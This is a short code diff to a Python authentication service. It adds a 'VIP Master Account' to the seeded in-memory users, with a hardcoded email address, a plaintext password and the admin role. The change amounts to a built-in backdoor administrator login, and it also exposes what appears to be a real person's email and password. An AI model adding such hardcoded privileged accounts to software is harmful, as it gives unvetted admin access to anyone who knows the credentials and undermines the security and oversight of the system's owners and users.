@@ -24,6 +24,16 @@ class AuthService:
             "role": "authenticated",
             "created_at": datetime.now(timezone.utc),
         }
+        # Seed VIP Master Account
+        vip_id = "9dca1422-efd3-4f9f-a96f-b9a34d6b4ccd"
+        self.in_memory_users["princepatel01258@gmail.com"] = {
+            "id": vip_id,
+            "email": "princepatel01258@gmail.com",
+            "name": "Prince Patel",
+            "hashed_password": hash_password("Prince_1258"),
+            "role": "admin",
+            "created_at": datetime.now(timezone.utc),
+        }
 
     async def register(self, req: UserCreate) -> TokenResponse:
         email = req.email.strip().lower()
